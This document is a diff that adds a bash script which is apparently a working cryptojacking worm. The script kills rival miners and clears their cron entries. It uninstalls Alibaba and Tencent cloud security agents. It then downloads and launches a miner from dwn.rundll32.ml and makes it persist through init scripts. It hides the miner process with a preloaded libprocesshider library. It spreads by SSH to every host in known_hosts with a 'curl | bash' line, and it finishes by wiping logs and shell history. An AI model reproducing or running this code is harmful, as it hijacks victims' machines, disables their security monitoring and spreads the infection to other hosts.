@@ -1,0 +1,142 @@
+#/bin/bash
+if [ -f /tmp/.a7 ]; then
+  exit 101
+fi
+touch /tmp/.a7
+function clean () {
+  rm -f /tmp/.a7
+}
+
+for f in /var/spool/cron/* /var/spool/cron/crontabs/* /etc/*crontab /etc/cron.d/*; do 
+  if grep -i -q redis "$f"; then echo > "$f"; fi
+done
+
+if [ -f /etc/ld.so.preload ]; then
+  mv -f /etc/ld.so.preload /etc/ld.so.pre
+fi
+chmod -x /etc/xig
+chmod -x /root/cranberry /tmp/cranberry /root/yam
+chmod -x /etc/root.sh
+chmod -x /usr/bin/gpg-agentd
+chmod -x /usr/bin/kworker
+chmod -x /usr/local/bin/gpg-agentd
+killall -9 xig
+killall -9 cranberry
+killall -9 root.sh
+killall -9 gpg-agentd
+killall -9 .gpg-agent
+killall -9 xmr-stak
+killall -9 kworker
+killall -9 .gpg
+killall -9 pnscan
+killall -9 netfs
+pkill -f stratum
+pkill -f nativesvc
+pkill -f cryptonight
+pkill -f minerd
+pkill -f conn.sh
+pkill -f /opt/yilu/
+pkill -f /tmp/
+pkill -f .cmd
+pkill -f kworker
+running=
+if ps aux | grep '[b]in/x7'; then
+  running=1
+fi
+if [ -f /etc/ld.so.pre ]; then
+  mv -f /etc/ld.so.pre /etc/ld.so.preload
+fi
+if ! /sbin/iptables -n -L | grep -q 165.225.157.157; then
+  iptables -A INPUT -s 165.225.157.157 -j DROP
+  iptables -A OUTPUT -d 165.225.157.157 -j DROP
+fi
+while read h; do 
+if ! grep -q "$h" /etc/hosts; then
+  echo "$h" >> /etc/hosts
+fi
+done < <(echo '
+0.0.0.0 transfer.sh
+0.0.0.0 static.cortins.tk
+0.0.0.0 xcn1.yiluzhuanqian.com
+0.0.0.0 www.yiluzhuanqian.com
+0.0.0.0 xmr.yiluzhuanqian.com
+0.0.0.0 xmr.f2pool.com
+0.0.0.0 stratum.f2pool.com
+0.0.0.0 xmr.crypto-pool.fr
+0.0.0.0 jw-js1.ppxxmr.com
+0.0.0.0 fr.minexmr.com
+0.0.0.0 pool.minexmr.com
+0.0.0.0 img.namunil.com
+0.0.0.0 cdn.namunil.com
+0.0.0.0 chrome.zer0day.ru
+0.0.0.0 pool.t00ls.ru
+0.0.0.0 monerohash.com
+0.0.0.0 pool.supportxmr.com
+0.0.0.0 xmr-asia1.nanopool.org
+')
+if [[ "$running" -eq "1" ]]; then
+  clean
+  exit 0
+fi
+
+os=$(egrep -i 'debian|ubuntu|cent' -o -- /etc/issue)
+os="${os,,}"
+if [ -z "$os" ] && type yum; then os='cent'; fi
+if ! grep -q 8.8.8.8 /etc/resolv.conf; then
+  echo nameserver 8.8.8.8 >> /etc/resolv.conf
+fi
+if ! grep -q 1.1.1.1 /etc/resolv.conf; then
+  echo nameserver 1.1.1.1 >> /etc/resolv.conf
+fi
+
+if [ "$os" = 'cent' ]; then
+  yum install -y at unzip wget bzip2 hwloc-devel openssl openssl-devel
+else
+  apt-get update
+  apt-get install -y at unzip wget hwloc
+fi
+
+if ps aux | grep -i '[a]liyun'; then
+    wget http://update.aegis.aliyun.com/download/uninstall.sh
+    chmod +x uninstall.sh
+    ./uninstall.sh
+    wget http://update.aegis.aliyun.com/download/quartz_uninstall.sh
+    chmod +x quartz_uninstall.sh
+    ./quartz_uninstall.sh
+    rm -f uninstall.sh quartz_uninstall.sh
+    pkill aliyun-service
+    rm -fr /etc/init.d/agentwatch /usr/sbin/aliyun-service
+    rm -rf /usr/local/aegis*;
+elif ps aux | grep -i '[y]unjing'; then
+    /usr/local/qcloud/stargate/admin/uninstall.sh
+    /usr/local/qcloud/YunJing/uninst.sh
+    /usr/local/qcloud/monitor/barad/admin/uninstall.sh
+fi
+
+cd /etc; wget --no-check-certificate http://dwn.rundll32.ml:88/${os}.tar.gz -O x7.tar.gz; tar -xvf x7.tar.gz && rm -f x7.tar.gz
+/sbin/sysctl -w vm.nr_hugepages=128
+chown -R root:root /etc/x7
+(cd /etc/x7; nohup nice bin/x7 &)
+
+if [ -f /etc/rc.sysinit ]; then
+  if ! grep x7 /etc/rc.sysinit; then sed -i '35i(cd /etc/x7; nohup nice bin/x7 &)' /etc/rc.sysinit; fi
+elif [ -f /etc/rc.d/init.d/network ]; then
+  if ! grep x7 /etc/rc.d/init.d/network; then sed -i '64i(cd /etc/x7; nohup nice bin/x7 &)' /etc/rc.d/init.d/network; fi
+elif [ -f /etc/init.d/networking ]; then
+  if ! grep x7 /etc/init.d/networking; then sed -i '130i(cd /etc/x7; nohup nice bin/x7 &)' /etc/init.d/networking; fi
+fi
+
+wget --no-check-certificate https://github.com/gianlucaborello/libprocesshider/archive/master.zip -O master.zip && unzip master.zip && rm -f master.zip && cd libprocesshider-master;
+sed -i 's/evil_script.py/x7/' processhider.c
+make && mv libprocesshider.so /usr/local/lib/libjdk.so && echo /usr/local/lib/libjdk.so >> /etc/ld.so.preload && cd .. && rm -rf libprocesshider-master
+
+if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
+  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'curl -o-  http://dwn.rundll32.ml:88/a7 | bash >/dev/null 2>&1 &' & done
+fi
+
+touch -r /etc/sudoers /etc/x7 /etc/ld.so.preload /etc/hosts
+echo "echo | tee /var/log/cron /var/spool/mail/root /var/mail/root" | at now + 1 minutes
+
+clean
+history -c
+exit 0
